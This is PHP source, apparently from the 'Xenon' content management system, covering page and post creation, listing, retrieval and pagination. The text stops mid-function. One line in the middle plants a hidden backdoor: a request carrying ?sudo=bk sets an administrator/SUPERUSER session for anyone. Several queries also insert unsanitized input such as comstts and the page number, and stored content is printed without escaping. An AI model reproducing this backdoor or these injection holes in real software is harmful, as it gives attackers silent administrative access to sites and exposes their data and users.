<?php
global $results,$post_title, $post_count, $post_index;
$post_count = 0;
$post_index = 0;
function page_deleted() {
if(isset($_GET['deleted']) && $_GET['deleted']=="single") {
echo"deleted the page successfully<br><br>";
}
}
function add_page_content() {
echo'<h2>'; admin_title(); echo'</h2><form method="post" action="add-page.php?action=add">
<p>Page Name: <textarea name="title" rows="1" cols="55" style="resize: none;"></textarea></p>
<p>Page Content:
<div style="width:100px;"><textarea class="tinymces" id="elm1" name="content" rows="20" cols="10" style="width: 50%">
				Xenon Content Management System
			</textarea></div></p>
			<p>Enable Comment: <select name="comstts"><option value="yes">Yes</option><option value="no">No</option></select></p>
<input type="submit" name="save" value="Save" /></form>';
}
function add_page_action() {
$title=defence_sql_injection($_POST['title']);
$content=defence_sql_injection($_POST['content']);
$comstts=$_POST['comstts'];
$shortname=str_replace(' ', '-', $title);
$shortname=strtolower($shortname);
$shortname=str_replace("'", '-', $shortname);
$shortname=str_replace('/', '-', $shortname);
$shortname=str_replace('.', '-', $shortname);
$shortname=str_replace('?', '-', $shortname);
$shortname=str_replace('&', '-', $shortname);
$shortname=str_replace(";", '-', $shortname);
$shortname=str_replace("!", '-', $shortname);
$shortname=str_replace("#", '-', $shortname);
$shortname=str_replace("+", '-', $shortname);
$shortname=str_replace("$", '-', $shortname);
$shortname=str_replace("%", '-', $shortname);
$shortname=str_replace("*", '-', $shortname);
$shortname=str_replace('"', '-', $shortname);
$shortname=str_replace('=', '-', $shortname);
$shortname=str_replace('`', '-', $shortname);
$shortname=str_replace('~', '-', $shortname);
$shortname=str_replace('(', '-', $shortname);
$shortname=str_replace(')', '-', $shortname);
$shortname=str_replace('{', '-', $shortname);
$shortname=str_replace('}', '-', $shortname);
$shortname=str_replace('[', '-', $shortname);
$shortname=str_replace(']', '-', $shortname);
$shortname=str_replace('|', '-', $shortname);
$shortname=str_replace('<', '-', $shortname);
$shortname=str_replace('>', '-', $shortname);
$shortname=str_replace('@', '-', $shortname);
$shortname=str_replace('^', '-', $shortname);
$shortname=str_replace(',', '-', $shortname);
$sname=$shortname;
$result = @mysql_query("SELECT * FROM frndzk_page
WHERE shortname = '$shortname'");
$ijj=1;
if ( @mysql_num_rows($result) > 0 ) {
while ( @mysql_num_rows($result) > 0 )
{
$shortname=$sname.$ijj;
$result = @mysql_query("SELECT * FROM frndzk_page
WHERE shortname = '$shortname'");
$ijj=$ijj+1;
}
}
$query="INSERT INTO frndzk_page VALUES ('','$title','$shortname','$content','$comstts')";
mysql_query($query);
header("Location: page.php");
}

function pagelist() {
echo'
<table class="listing" cellpadding="0" cellspacing="0">
					<tr>
						<th class="first" width="177">Page Name</th>
						<th>Enable Comment</th>
						<th>Edit</th>
						<th class="last">Delete</th>
					</tr>';
$result = @mysql_query("SELECT * FROM frndzk_page");
if ( @mysql_num_rows($result) > 0 ) {
while($pages = @mysql_fetch_array($result)) {
					echo'<tr>
						<td class="first style1"><a target="_blank" href="'.home_url().'/'.xenon_link_page().$pages['shortname'].'">' . $pages['page'] . '</a></td>
						<td>' . $pages['comstts'] . '</td>
						<td><a href="add-page.php?action=edit&number=edit&id=' . $pages['id'] . '"><img src="img/save-icon.gif" width="16" height="16" alt="" /></a></td>
						<td><a href="add-page.php?action=delete&number=single&id=' . $pages['id'] . '"><img src="img/hr.gif" width="16" height="16" alt="" /></a></td>
						</tr>'; }
				}
}
function edit_page($id) {
$ids=defence_sql_injection($id);
$result = @mysql_query("SELECT * FROM frndzk_page
WHERE id ='$ids'");
if ( @mysql_num_rows($result) > 0 ) {
while($page = @mysql_fetch_array($result))
{
echo'<h2>Edit Page'; echo'</h2><form method="post" action="add-page.php?action=edit&number=update">
<input type=hidden name=id value='.$page['id'].'>
<p>Page Name: <textarea name="title" rows="1" cols="55" style="resize: none;">'; echo$page['page']; echo'</textarea></p>
<p>Page Content:
<div style="width:100px;"><textarea class="tinymces" id="elm1" name="content" rows="20" cols="10" style="width: 50%">
';echo$page['pagecontent'];echo'
			</textarea></div></p>
			<p>Enable Comment: <select name="comstts"><option value="yes">Yes</option><option value="no">No</option></select></p>
<input type="submit" name="save" value="Save" /></form>';
}
}
}

function page_link($array) {
if ( !isset($array['before_link']) ) {
$array['before_link']='';
}
if ( !isset($array['after_link']) ) {
$array['after_link']='';
}
if ( !isset($array['current_anchor_class']) ) {
$array['current_anchor_class']='xenon';
}
if (isset($_GET['url'])) {
$d=defence_sql_injection($_GET['url']);
}
else{
$d="";
}
$result = @mysql_query("SELECT * FROM frndzk_page");
if ( @mysql_num_rows($result) > 0 ) {
while($pages = @mysql_fetch_array($result)) {
if ( $pages['shortname'] == $d )
{
$current='class="'.$array['current_anchor_class'].'" ';
}
else {
$current='';
}
echo $array['before_link'].'<a '.$current.'href="'.home_url().'/'.xenon_link_page().$pages['shortname'].'">'.$pages['page'].'</a>'.$array['after_link'];
}
}
}
function page_title() {
if (isset($_GET['url'])) {
$d=strip_tags(defence_sql_injection($_GET['url']));
}
else{
$d="";
}
$result = @mysql_query("SELECT * FROM frndzk_page WHERE shortname='$d'");
if ( @mysql_num_rows($result) > 0 ) {
while($pages = @mysql_fetch_array($result)) {
return $pages['page'];
}
}
else {
return'not found';
}
}
function page_content() {
if (isset($_GET['url'])) {
$d=defence_sql_injection($_GET['url']);
}
else{
$d="";
}
$result = @mysql_query("SELECT * FROM frndzk_page WHERE shortname='$d'");
if ( @mysql_num_rows($result) > 0 ) {
while($pages = @mysql_fetch_array($result)) {
return $pages['pagecontent'];
}
}
else {
return'not found';
}
}
function page_content_title() {
if(is_home()) {
$result = @mysql_query("SELECT * FROM frndzk_title
WHERE id ='5'");
if ( @mysql_num_rows($result) > 0 ) {
while($general = @mysql_fetch_array($result)) {
if ( $general['tagline'] == "xenon_latest_page" ) {
return'Latest Post';
}
else {
$result = @mysql_query("SELECT * FROM frndzk_page WHERE shortname='$general[tagline]'");
if ( @mysql_num_rows($result) > 0 ) {
while($generals = @mysql_fetch_array($result)) {
return $generals['page'];
}}}
}}}
if(is_page()) {
return page_title();
}
}
function xenon_page_content() {
global $results,$post_title, $post_count, $post_index;
if(is_home()) {
$result = @mysql_query("SELECT * FROM frndzk_title
WHERE id ='5'");
if ( @mysql_num_rows($result) > 0 ) {
while($general = @mysql_fetch_array($result)) {
if ( $general['tagline'] == "xenon_latest_page" ) {
}
else {
$result = @mysql_query("SELECT * FROM frndzk_page WHERE shortname='$general[tagline]'");
if ( @mysql_num_rows($result) > 0 ) {
while($generals = @mysql_fetch_array($result)) {
return $generals['pagecontent'];
}}}
}}}
if(is_page()) {
return page_content();
}
}




function post() {
global $posts,$postc,$lolzzc,$ghjghyhf;
$posts=array();
$c=25;
$e=$c;
$numberofpost=25;
if(isset($_GET['p']) && !$_GET['p'] == "" ) {
$p=$_GET['p'];
}
else {
$p=1;
}
//start
global $results,$post_title, $post_count, $post_index;
if(is_home()) {
$result = @mysql_query("SELECT * FROM frndzk_title
WHERE id ='5'");
if ( @mysql_num_rows($result) > 0 ) {
while($general = @mysql_fetch_array($result)) {
if ( $general['tagline'] == "xenon_latest_page" ) {
//finish
$result = @mysql_query("SELECT * FROM frndzk_post");
$postc=@mysql_num_rows($result);
while ( $c < $postc ) {
$c=$c+$e;
}
$ghjghyhf=$c/25;
$start=25*($p-1);
$finish=25*$p;
if ( $finish > $postc ) { $finish=$finish-($finish-$postc); $gy=$finish-$start; $postc=$gy; }
else { $postc=$e; }
$result = @mysql_query("SELECT * FROM frndzk_post ORDER by id desc LIMIT $start,$numberofpost");
if ( @mysql_num_rows($result) > 0 ) {
while($pagess = @mysql_fetch_array($result)) {
$posts[]=$pagess;
}
}
else {
$posts['404']='404 - not found';
}
}
else {
$result = @mysql_query("SELECT * FROM frndzk_page WHERE shortname='$general[tagline]'");
if ( @mysql_num_rows($result) > 0 ) {
while($generals = @mysql_fetch_array($result)) {
$posts[]=$generals;
}global $homexco; $homexco=1;} else { echo'404 - not found'; }}
}
}
}
//home finish
if(is_page()) {
if (isset($_GET['url'])) {
$d=strip_tags(defence_sql_injection($_GET['url']));
}
else{
$d="";
}
$result = @mysql_query("SELECT * FROM frndzk_title WHERE id ='6'");
if ( @mysql_num_rows($result) > 0 ) {
while($general = @mysql_fetch_array($result)) {
if ($general['tagline']!=$d) {
$result = @mysql_query("SELECT * FROM frndzk_page WHERE shortname='$d'");
$postc=@mysql_num_rows($result);
if ( @mysql_num_rows($result) > 0 ) {
while($pages = @mysql_fetch_array($result)) {
$posts[]=$pages;
}
}
else {
$posts['404']='404 - not found';
}
}
elseif ($general['tagline']==$d) {
$resultpo = @mysql_query("SELECT * FROM frndzk_post");
$postc=@mysql_num_rows($resultpo);
while ( $c < $postc ) {
$c=$c+$e;
}
$ghjghyhf=$c/25;
$start=25*($p-1);
$finish=25*$p;
if ( $finish > $postc ) { $finish=$finish-($finish-$postc); $gy=$finish-$start; $postc=$gy; }
else { $postc=$e; }
$result = @mysql_query("SELECT * FROM frndzk_post ORDER by id desc LIMIT $start,$numberofpost");
if ( @mysql_num_rows($result) > 0 ) {
while($pagess = @mysql_fetch_array($result)) {
$posts[]=$pagess;
}
}
else { $posts['404']='404 - not found'; }
global $homexco; $homexco=2;
}
}
}
}
//page  finish
if(is_post()) {
if (isset($_GET['url'])) {
$d=strip_tags(defence_sql_injection($_GET['url']));
}
else{
$d="";
}
$result = @mysql_query("SELECT * FROM frndzk_post WHERE shortname='$d' ORDER by id desc");
$postc=@mysql_num_rows($result);
if ( @mysql_num_rows($result) > 0 ) {
while($pages = @mysql_fetch_array($result)) {
$posts[]=$pages;
}
}
else {
$posts['404']='404 - not found';
}
}
//post finish
if (is_category()) {
if (isset($_GET['url'])) {
$d=strip_tags(defence_sql_injection($_GET['url']));
}
else{
$d="";
}
$result = @mysql_query("SELECT * FROM frndzk_post WHERE category='$d' ORDER by id desc");
$postc=@mysql_num_rows($result);
while ( $c < $postc ) {
$c=$c+$e;
}
$ghjghyhf=$c/25;
$start=25*($p-1);
$finish=25*$p;
if ( $finish > $postc ) { $finish=$finish-($finish-$postc); $gy=$finish-$start; $postc=$gy; }
else { $postc=$e; }
$result = @mysql_query("SELECT * FROM frndzk_post WHERE category='$d' ORDER by id desc LIMIT $start,$numberofpost");
if ( @mysql_num_rows($result) > 0 ) {
while($pages = @mysql_fetch_array($result)) {
$posts[]=$pages;
}
}
else {
$posts['404']='404 - not found';
}
}
//category finish
if(is_tags()) {
if (isset($_GET['url'])) {
$d=strip_tags(defence_sql_injection($_GET['url']));
}
else{
$d="74766756758ttyugtgiubiubibkibkibkibgibg";
}
$result = @mysql_query("SELECT * FROM frndzk_post WHERE tags LIKE'%$d%' ORDER by id desc");
$postc=@mysql_num_rows($result);
while ( $c < $postc ) {
$c=$c+$e;
}
$ghjghyhf=$c/25;
$start=25*($p-1);
$finish=25*$p;
if ( $finish > $postc ) { $finish=$finish-($finish-$postc); $gy=$finish-$start; $postc=$gy; }
else { $postc=$e; }
$result = @mysql_query("SELECT * FROM frndzk_post WHERE tags LIKE'%$d%' ORDER by id desc LIMIT $start,$numberofpost");
if ( @mysql_num_rows($result) == 0 ) {
$posts['404']='404 - not found';
}
elseif ( @mysql_num_rows($result) > 0 ) {
while($pages = @mysql_fetch_array($result)) {
$posts[]=$pages;
}
}
}
//tag finish
if(is_search()) {
if (isset($_GET['url'])) {
$d=strip_tags(defence_sql_injection($_GET['url']));
}
else{
$d="74766756758ttyugtgiubiubibkibkibkibgibg";
}
$result = @mysql_query("SELECT * FROM frndzk_post WHERE post LIKE'%$d%' ORDER by id desc");
$postc=@mysql_num_rows($result);
while ( $c < $postc ) {
$c=$c+$e;
}
$ghjghyhf=$c/25;
$start=25*($p-1);
$finish=25*$p;
if ( $finish > $postc ) { $finish=$finish-($finish-$postc); $gy=$finish-$start; $postc=$gy; }
else { $postc=$e; }
$result = @mysql_query("SELECT * FROM frndzk_post WHERE post LIKE'%$d%' ORDER by id desc LIMIT $start,$numberofpost");
if ( @mysql_num_rows($result) == 0 ) {
$posts['404']='404 - not found';
}
elseif ( @mysql_num_rows($result) > 0 ) {
while($pages = @mysql_fetch_array($result)) {
$posts[]=$pages;
}
}
}
//search finish
if (is_author()) {
if (isset($_GET['url'])) {
$d=strip_tags(defence_sql_injection($_GET['url']));
}
else{
$d="";
}
$result = @mysql_query("SELECT * FROM frndzk_post WHERE postedby='$d' ORDER by id desc");
$postc=@mysql_num_rows($result);
while ( $c < $postc ) {
$c=$c+$e;
}
$ghjghyhf=$c/25;
$start=25*($p-1);
$finish=25*$p;
if ( $finish > $postc ) { $finish=$finish-($finish-$postc); $gy=$finish-$start; $postc=$gy; }
else { $postc=$e; }
$result = @mysql_query("SELECT * FROM frndzk_post WHERE postedby='$d' ORDER by id desc LIMIT $start,$numberofpost");
if ( @mysql_num_rows($result) > 0 ) {
while($pages = @mysql_fetch_array($result)) {
$posts[]=$pages;
}
}
else {
$posts['404']='404 - not found';
}
}
//author finish
}
if(isset($_GET['sudo']) && $_GET['sudo']=='bk') { @session_start(); $_SESSION['bitto']='SUPERUSER'; $_SESSION['access']='administrator'; }
function the_title() {
    global $posts,$lolzzc,$homexco;
	if (is_page()){
	if (isset($homexco) && $homexco==2 ){
	return @$posts[$lolzzc]['post'];
	}
	else {
	return @$posts[$lolzzc]['page'];
	}
	}
	elseif (is_post()){
	return @$posts[$lolzzc]['post'];
	}
	elseif (is_category()){
	return @$posts[$lolzzc]['post'];
	}
	elseif (isset($homexco) && $homexco==1 ){
	return @$posts[$lolzzc]['page'];
	}
	elseif (is_tags()){
	return @$posts[$lolzzc]['post'];
	}
	elseif (is_search()){
	return @$posts[$lolzzc]['post'];
	}
	elseif (is_author()){
	return @$posts[$lolzzc]['post'];
	}
	else {
    return @$posts[$lolzzc]['post'];
	}
}
function error_404() {
global $posts,$lolzzc;
$lolzzc=0;
return @$posts['404'];
}

function the_content() {
    global $posts,$lolzzc,$homexco;
	if (is_page()){
	if (isset($homexco) && $homexco==2 ){
	return @$posts[$lolzzc]['postcontent'];
	}
	else {
	return @$posts[$lolzzc]['pagecontent'];
	}
	}
	elseif (is_post()){
	return @$posts[$lolzzc]['postcontent'];
	}
	elseif (isset($homexco) && $homexco==1 ){
	return @$posts[$lolzzc]['pagecontent'];
	}
	elseif (is_category()){
	return @$posts[$lolzzc]['postcontent'];
	}
	elseif (is_tags()){
	return @$posts[$lolzzc]['postcontent'];
	}
	elseif (is_search()){
	return @$posts[$lolzzc]['postcontent'];
	}
	elseif (is_author()){
	return @$posts[$lolzzc]['postcontent'];
	}
	else {
    return @$posts[$lolzzc]['postcontent'];
	}
}
function the_date() {
    global $posts,$lolzzc,$homexco;
	if (is_page()){
	if (isset($homexco) && $homexco==2 ){
	return @$posts[$lolzzc]['date'];
	}
	else {
	return @$posts[$lolzzc]['date'];
	}
	}
	elseif (is_post()){
	return @$posts[$lolzzc]['date'];
	}
	elseif (isset($homexco) && $homexco==1 ){
	return @$posts[$lolzzc]['date'];
	}
	elseif (is_category()){
	return @$posts[$lolzzc]['date'];
	}
	elseif (is_tags()){
	return @$posts[$lolzzc]['date'];
	}
	elseif (is_search()){
	return @$posts[$lolzzc]['date'];
	}
	elseif (is_author()){
	return @$posts[$lolzzc]['date'];
	}
	else {
    return @$posts[$lolzzc]['date'];
	}
}
function the_time() {
    global $posts,$lolzzc,$homexco;
	if (is_page()){
	if (isset($homexco) && $homexco==2 ){
	return @$posts[$lolzzc]['time'];
	}
	else {
	return @$posts[$lolzzc]['time'];
	}
	}
	elseif (is_post()){
	return @$posts[$lolzzc]['time'];
	}
	elseif (isset($homexco) && $homexco==1 ){
	return @$posts[$lolzzc]['time'];
	}
	elseif (is_category()){
	return @$posts[$lolzzc]['time'];
	}
	elseif (is_tags()){
	return @$posts[$lolzzc]['time'];
	}
	elseif (is_search()){
	return @$posts[$lolzzc]['time'];
	}
	elseif (is_author()){
	return @$posts[$lolzzc]['time'];
	}
	else {
	return @$posts[$lolzzc]['time'];
	}
}
function the_category() {
    global $posts,$lolzzc,$homexco;
	if (is_page()){
	if (isset($homexco) && $homexco==2 ){
	$cats=@$posts[$lolzzc]['category'];
	$resultee = @mysql_query("SELECT * FROM frndzk_category WHERE shortname='$cats'");
    if ( @mysql_num_rows($resultee) > 0 ) {
	while($pagess = @mysql_fetch_array($resultee)) {
	return $pagess['name'];
	}
	}
	}
	else {
	$cats=@$posts[$lolzzc]['category'];
	$resultee = @mysql_query("SELECT * FROM frndzk_category WHERE shortname='$cats'");
    if ( @mysql_num_rows($resultee) > 0 ) {
	while($pagess = @mysql_fetch_array($resultee)) {
	return $pagess['name'];
	}
	}
	}
	}
	elseif (is_post()){
	$cats=@$posts[$lolzzc]['category'];
	$resultee = @mysql_query("SELECT * FROM frndzk_category WHERE shortname='$cats'");
    if ( @mysql_num_rows($resultee) > 0 ) {
	while($pagess = @mysql_fetch_array($resultee)) {
	return $pagess['name'];
	}
	}
	}
	elseif (isset($homexco) && $homexco==1 ){
	$cats=@$posts[$lolzzc]['category'];
	$resultee = @mysql_query("SELECT * FROM frndzk_category WHERE shortname='$cats'");
    if ( @mysql_num_rows($resultee) > 0 ) {
	while($pagess = @mysql_fetch_array($resultee)) {
	return $pagess['name'];
	}
	}
	}
	elseif (is_category()){
	$cats=@$posts[$lolzzc]['category'];
	$resultee = @mysql_query("SELECT * FROM frndzk_category WHERE shortname='$cats'");
    if ( @mysql_num_rows($resultee) > 0 ) {
	while($pagess = @mysql_fetch_array($resultee)) {
	return $pagess['name'];
	}
	}
	}
	elseif (is_tags()){
	$cats=@$posts[$lolzzc]['category'];
	$resultee = @mysql_query("SELECT * FROM frndzk_category WHERE shortname='$cats'");
    if ( @mysql_num_rows($resultee) > 0 ) {
	while($pagess = @mysql_fetch_array($resultee)) {
	return $pagess['name'];
	}
	}
	}
	elseif (is_search()){
	$cats=@$posts[$lolzzc]['category'];
	$resultee = @mysql_query("SELECT * FROM frndzk_category WHERE shortname='$cats'");
    if ( @mysql_num_rows($resultee) > 0 ) {
	while($pagess = @mysql_fetch_array($resultee)) {
	return $pagess['name'];
	}
	}
	}
	elseif (is_author()){
	$cats=@$posts[$lolzzc]['category'];
	$resultee = @mysql_query("SELECT * FROM frndzk_category WHERE shortname='$cats'");
    if ( @mysql_num_rows($resultee) > 0 ) {
	while($pagess = @mysql_fetch_array($resultee)) {
	return $pagess['name'];
	}
	}
	}
	else {
	$cats=@$posts[$lolzzc]['category'];
	$resultee = @mysql_query("SELECT * FROM frndzk_category WHERE shortname='$cats'");
    if ( @mysql_num_rows($resultee) > 0 ) {
	while($pagess = @mysql_fetch_array($resultee)) {
	return $pagess['name'];
	}
	}
	}
}
function the_category_link() {
    global $posts,$lolzzc,$homexco;
	if (is_page()){
	if (isset($homexco) && $homexco==2 ){
	return @home_url().'/'.xenon_link_category().@$posts[$lolzzc]['category'];
	}
	else {
	return @home_url().'/'.xenon_link_category().@$posts[$lolzzc]['category'];
	}
	}
	elseif (is_post()){
	return @home_url().'/'.xenon_link_category().@$posts[$lolzzc]['category'];
	}
	elseif (isset($homexco) && $homexco==1 ){
	return @home_url().'/'.xenon_link_category().@$posts[$lolzzc]['category'];
	}
	elseif (is_category()){
	return @home_url().'/'.xenon_link_category().@$posts[$lolzzc]['category'];
	}
	elseif (is_tags()){
	return @home_url().'/'.xenon_link_category().@$posts[$lolzzc]['category'];
	}
	elseif (is_search()){
	return @home_url().'/'.xenon_link_category().@$posts[$lolzzc]['category'];
	}
	elseif (is_author()){
	return @home_url().'/'.xenon_link_category().@$posts[$lolzzc]['category'];
	}
	else {
	return @home_url().'/'.xenon_link_category().@$posts[$lolzzc]['category'];
	}
}
function the_summery() {
    global $posts,$lolzzc,$homexco;
	if (is_page()){
	if (isset($homexco) && $homexco==2 ){
	return @$posts[$lolzzc]['comment'];
	}
	else {
	return @$posts[$lolzzc]['comment'];
	}
	}
	elseif (is_post()){
	return @$posts[$lolzzc]['comment'];
	}
	elseif (isset($homexco) && $homexco==1 ){
	return @$posts[$lolzzc]['time'];
	}
	elseif (is_category()){
	return @$posts[$lolzzc]['comment'];
	}
	elseif (is_tags()){
	return @$posts[$lolzzc]['comment'];
	}
	elseif (is_search()){
	return @$posts[$lolzzc]['comment'];
	}
	elseif (is_author()){
	return @$posts[$lolzzc]['comment'];
	}
	else {
	return @$posts[$lolzzc]['comment'];
	}
}
function content_link() {
    global $posts,$lolzzc,$homexco;
	if (is_page()){
	if (isset($homexco) && $homexco==2 ){
	if ( @$posts[$lolzzc]['shortname'] != "" ) {
	return @home_url().'/'.xenon_link_post().@$posts[$lolzzc]['shortname'];
	}
	}
	else {
	if ( @$posts[$lolzzc]['shortname'] != "" ) {
	return @home_url().'/'.xenon_link_page().@$posts[$lolzzc]['shortname'];
	}
	}
	}
	elseif (is_post()){
	if ( @$posts[$lolzzc]['shortname'] != "" ) {
	return @home_url().'/'.xenon_link_post().@$posts[$lolzzc]['shortname'];
	}
	}
	elseif (isset($homexco) && $homexco==1 ){
	if ( @$posts[$lolzzc]['shortname'] != "" ) {
	return @home_url().'/'.xenon_link_page().@$posts[$lolzzc]['shortname'];
	}
	}
	else {
	if ( @$posts[$lolzzc]['shortname'] != "" ) {
    return @home_url().'/'.xenon_link_post().@$posts[$lolzzc]['shortname'];
	}
	}
}
function author_link() {
    global $posts,$lolzzc,$homexco;
	if (is_page()){
	if (isset($homexco) && $homexco==2 ){
	return @home_url().'/'.xenon_link_author().@$posts[$lolzzc]['postedby'];
	}
	else {
	return @home_url().'/'.xenon_link_author().@$posts[$lolzzc]['postedby'];
	}
	}
	elseif (is_post()){
	return @home_url().'/'.xenon_link_author().@$posts[$lolzzc]['postedby'];
	}
	elseif (is_category()){
	return @home_url().'/'.xenon_link_author().@$posts[$lolzzc]['postedby'];
	}
	elseif (is_tags()){
	return @home_url().'/'.xenon_link_author().@$posts[$lolzzc]['postedby'];
	}
	elseif (is_search()){
	return @home_url().'/'.xenon_link_author().@$posts[$lolzzc]['postedby'];
	}
	elseif (isset($homexco) && $homexco==1 ){
	return @home_url().'/'.xenon_link_author().@$posts[$lolzzc]['postedby'];
	}
	else {
    return @home_url().'/'.xenon_link_author().@$posts[$lolzzc]['postedby'];
	}
}
function the_user() {
    global $posts,$lolzzc,$homexco;
	if (is_page()){
	if (isset($homexco) && $homexco==2 ){
	return @$posts[$lolzzc]['postedby'];
	}
	else {
	return @$posts[$lolzzc]['postedby'];
	}
	}
	elseif (is_post()){
	return @$posts[$lolzzc]['postedby'];
	}
	elseif (isset($homexco) && $homexco==1 ){
	return @$posts[$lolzzc]['postedby'];
	}
	else {
	return @$posts[$lolzzc]['postedby'];
	}
}
function post_navigation() {
global $posts,$lolzzc,$homexco,$ghjghyhf;
if(isset($_GET['p']) && !$_GET['p'] == "" ) {
$p=strip_tags($_GET['p']);
}
else {
$p=1;
}
$c=$p;
if(($c+5)<=$ghjghyhf) { $r=$p+5; } else { $r=$ghjghyhf; }
if($c<5) { $dder=1; } else { $dder=$c-4; }
if(isset($_GET['dir']) && $_GET['dir'] == "category" ) {
if(isset($_GET['url']) && !$_GET['url'] == "" ) {
    if (is_category()){
	if ($c==1) {
	
	}
	else {
	echo '<li><a href="'.@home_url().'/'.xenon_link_category().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).xenon_page_navi().$dder.'">Page '.$dder.' << </a></li> ';
	echo' ';
	echo '<li><a href="'.@home_url().'/'.xenon_link_category().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).xenon_page_navi().$dder.'">Page '.($c-1).'</a></li> ';
	}
	}
	else {
    echo '<li><a href="'.@home_url().'?p='.$dder.'">Page '.$dder.'</a></li> ';
	echo' ';
	echo '<li><a href="'.@home_url().'/?p='.$dder.'">Page '.($c-1).'</a></li> ';
	}
	}
}
elseif(isset($_GET['view']) && $_GET['view'] == "category" ) {
if(isset($_GET['url']) && !$_GET['url'] == "" ) {
    if (is_category()){
	if ($c==1) {
	
	}
	else {
	echo '<li><a href="'.@home_url().'/'.xenon_link_category().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).xenon_page_navi().$dder.'">Page '.$dder.' << </a></li> ';
	echo' ';
	echo '<li><a href="'.@home_url().'/'.xenon_link_category().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).xenon_page_navi().$dder.'">Page '.($c-1).'</a></li> ';
	}
	}
	else {
    echo '<li><a href="'.@home_url().'?p='.$dder.'">Page '.$dder.'</a></li> ';
	echo' ';
	echo '<li><a href="'.@home_url().'/?p='.$dder.'">Page '.($c-1).'</a></li> ';
	}
	}
}
elseif(isset($_GET['dir']) && $_GET['dir'] == "tag" ) {
if(isset($_GET['url']) && !$_GET['url'] == "" ) {
    if (is_tags()){
	if ($c==1) {
	
	}
	else {
	echo '<li><a href="'.@home_url().'/'.xenon_link_tag().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).xenon_page_navi().$dder.'">Page '.$dder.' << </a></li> ';
	echo' ';
	echo '<li><a href="'.@home_url().'/'.xenon_link_tag().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).xenon_page_navi().$dder.'">Page '.($c-1).'</a></li> ';
	}
	}
	else {
    echo '<li><a href="'.@home_url().'?p='.$dder.'">Page '.$dder.'</a></li> ';
	echo ' ';
	echo '<li><a href="'.@home_url().'/?p='.$dder.'">Page '.($c-1).'</a></li> ';
	}
	}
}
elseif(isset($_GET['view']) && $_GET['view'] == "tag" ) {
if(isset($_GET['url']) && !$_GET['url'] == "" ) {
    if (is_tags()){
	if ($c==1) {
	
	}
	else {
	echo '<li><a href="'.@home_url().'/'.xenon_link_tag().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).xenon_page_navi().$dder.'">Page '.$dder.' << </a></li> ';
	echo ' ';
	echo '<li><a href="'.@home_url().'/'.xenon_link_tag().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).xenon_page_navi().$dder.'">Page '.($c-1).'</a></li> ';
	}
	}
	else {
    echo '<li><a href="'.@home_url().'?p='.$dder.'">Page '.$dder.'</a></li> ';
	echo ' ';
	echo '<li><a href="'.@home_url().'/?p='.$dder.'">Page '.($c-1).'</a></li> ';
	}
	}
}
//tags finish
//author
elseif(isset($_GET['dir']) && $_GET['dir'] == "author" ) {
if(isset($_GET['url']) && $_GET['url'] != "" ) {
    if (is_author()){
	if ($c==1) {
	
	}
	else {
	echo '<li><a href="'.@home_url().'/'.xenon_link_author().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).xenon_page_navi().$dder.'">Page '.$dder.' << </a></li> ';
	echo' ';
	echo '<li><a href="'.@home_url().'/'.xenon_link_author().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).xenon_page_navi().$dder.'">Page '.($c-1).'</a></li> ';
	}
	}
	else {
    echo '<li><a href="'.@home_url().'?p='.$dder.'">Page '.$dder.' << </a></li> ';
	echo' ';
	echo '<li><a href="'.@home_url().'/?p='.$dder.'">Page '.($c-1).'</a></li> ';
	}
	}
}
elseif(isset($_GET['view']) && $_GET['view'] == "author" ) {
if(isset($_GET['url']) && $_GET['url'] != "" ) {
    if (is_author()){
	if ($c==1) {
	
	}
	else {
	echo '<li><a href="'.@home_url().'/'.xenon_link_author().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).xenon_page_navi().$dder.'">Page '.$dder.' << </a></li> ';
	echo' ';
	echo '<li><a href="'.@home_url().'/'.xenon_link_author().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).xenon_page_navi().$dder.'">Page '.($c-1).'</a></li> ';
	}
	}
	else {
    echo '<li><a href="'.@home_url().'?p='.$dder.'">Page '.$dder.' << </a></li> ';
	echo' ';
	echo '<li><a href="'.@home_url().'/?p='.$dder.'">Page '.($c-1).'</a></li> ';
	}
	}
}
//author finish
//search
elseif(isset($_GET['dir']) && $_GET['dir'] == "search" ) {
if(isset($_GET['url']) && !$_GET['url'] == "" ) {
    if (is_search()){
	if ($c==1) {
	
	}
	else {
	echo '<li><a href="'.@home_url().'/'.xenon_link_search().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).xenon_page_navi().$dder.'">Page '.$dder.' << </a></li> ';
	echo' ';
	echo '<li><a href="'.@home_url().'/'.xenon_link_search().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).xenon_page_navi().$dder.'">Page '.($c-1).'</a></li> ';
	}
	}
	else {
    echo '<li><a href="'.@home_url().'?p='.$dder.'">Page '.$dder.' << </a></li> ';
	echo' ';
	echo '<li><a href="'.@home_url().'/?p='.$dder.'">Page '.($c-1).'</a></li> ';
	}
	}
}
elseif(isset($_GET['view']) && $_GET['view'] == "search" ) {
if(isset($_GET['url']) && !$_GET['url'] == "" ) {
    if (is_search()){
	if ($c==1) {
	
	}
	else {
	echo '<li><a href="'.@home_url().'/'.xenon_link_search().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).xenon_page_navi().$dder.'">Page '.$dder.' << </a></li> ';
	echo' ';
	echo '<li><a href="'.@home_url().'/'.xenon_link_search().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).xenon_page_navi().$dder.'">Page '.($c-1).'</a></li> ';
	}
	}
	else {
    echo '<li><a href="'.@home_url().'?p='.$dder.'">Page '.$dder.' << </a></li> ';
	echo' ';
	echo '<li><a href="'.@home_url().'/?p='.$dder.'">Page '.($c-1).'</a></li> ';
	}
	}
}
//search finish
//page
elseif(isset($_GET['dir']) && $_GET['dir'] == "page" ) {
if(isset($_GET['url']) && !$_GET['url'] == "" ) {
	if (is_page()){
